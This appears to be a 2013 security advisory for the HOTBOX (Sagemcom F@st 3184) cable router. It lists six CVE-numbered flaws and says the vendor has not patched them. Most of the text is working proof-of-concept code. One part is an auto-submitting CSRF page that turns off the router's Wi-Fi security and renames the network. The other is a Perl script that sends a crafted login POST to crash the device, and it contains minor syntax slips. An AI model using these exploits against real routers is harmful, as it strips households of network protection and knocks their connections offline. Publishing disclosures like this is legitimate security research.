@@ -1,0 +1,91 @@
++------------------------------------------------------------------------------+
+| HOTBOX is the leading router/modem appliance of      |
+|  HOT Cable communication company in israel.           |
+| The Appliance is manufactured by SAGEMCOM         |
+| and carries the model name F@st 3184.                     |
++------------------------------------------------------------------------------+
+| Title: HOTBOX Multiple Vulnerabilities                         |
++--------------------+---------------------------------------------------------+
+| Release Date       | 2013/09/09                                    |
+| Researcher         | Oz Elisyan                                     |
++--------------------+---------------------------------------------------------+
+| System Affected    | HOTBOX Router/Modem               |
+| Versions Affected  | 2.1.11 , possibly earlier                 |
+| Related CVE Numbers | CVE-2013-5037, CVE-2013-5038|
+| CVE-2013-5220, CVE-2013-5219, CVE-2013-5218,       |
+| CVE-2013-5039                                                         |
+| Vendor Patched | N/A                                                 |
+| Classification     | 0-day                                              |
+| Exploits | http://elisyan.com/hotboxDoS.pl,                  |
+| http://elisyan.com/hotboxCSRF.html                           |
++--------------------+---------------------------------------------------------+
+
+Vulnerabilities List -
+# Default WPS Pin
+# Authentication based on IP Address
+# DoS via crafted POST
+# Path/Directory Traversal
+# Script injection via DHCP request
+# No CSRF Token
+
+Demo -
+http://www.youtube.com/watch?v=CPlT09ZIj48
+
+
+
+CSRF EXPLOIT: 
+
+
+<html>
+    <form action='http://192.168.1.1/goform/wlanBasicSecurity' method='POST' id=1>
+        <input type=hidden name="WirelessMacAddr" value="C0%3AAC%3A54%3AF8%3A67%3A58" id="WirelessMacAddr">
+        <input type=hidden name="WirelessEnable1" value="1" id="WirelessEnable1">
+    <input type=hidden name="ServiceSetIdentifier1" value="Elisyan" id="ServiceSetIdentifier1">
+    <input type=hidden name="WirelessVendorMode" value="3" id="WirelessVendorMode">
+    <input type=hidden name="ChannelNumber1" value="0" id="ChannelNumber1">
+    <input type=hidden name="NBandwidth1" value="20" id="NBandwidth1">
+    <input type=hidden name="ClosedNetwork1" value="0" id="ClosedNetwork1">
+    <input type=hidden name="WifiSecurity" value="0" id="WifiSecurity">
+    <input type=hidden name="commitwlanBasicSecurity" value="1" id="commitwlanBasicSecurity">
+    <input type=hidden name="restoreWirelessDefaults1" value="0" id="restoreWirelessDefaults1">
+    <input type=hidden name="scanActions1" value="0" id="scanActions1">
+    <input type=hidden name="AutoSecurity1" value="1" id="AutoSecurity1">
+    <input type=hidden name="wpsActions1" value="0" id="wpsActions1">
+    
+
+    </form>
+</html>
+<script>document.getElementById(1).submit();</script>
+
+
+
+DENIAL OF SERVICE EXPLOIT:
+
+use warnings;
+use HTTP::Request::Common qw(POST);
+use LWP::UserAgent;
+
+
+# Author: Oz Elisyan
+# Date: 3 September 2013
+# Affected Version: <= 2.1.11
+
+print "# HOTBOX DoS PoC #\n\n"
+
+unless ($ARGV[0]){
+  print "Please Enter Valid Host Name.\n";
+  exit();
+}
+
+print "Sending Evil POST request...\n";
+
+my $HOST = $ARGV[0];
+my $URL = "http://$HOST/goform/login";
+my $PostData = "loginUsername=aaaloginPassword=aaa"
+my $browser = LWP::UserAgent->new();
+my $req = HTTP::Request->new(POST => $URL);
+$req->content_type("application/x-www-form-urlencoded");
+$req->content($PostData);
+my $resp = $browser->request($req);
+
+print "Done.";
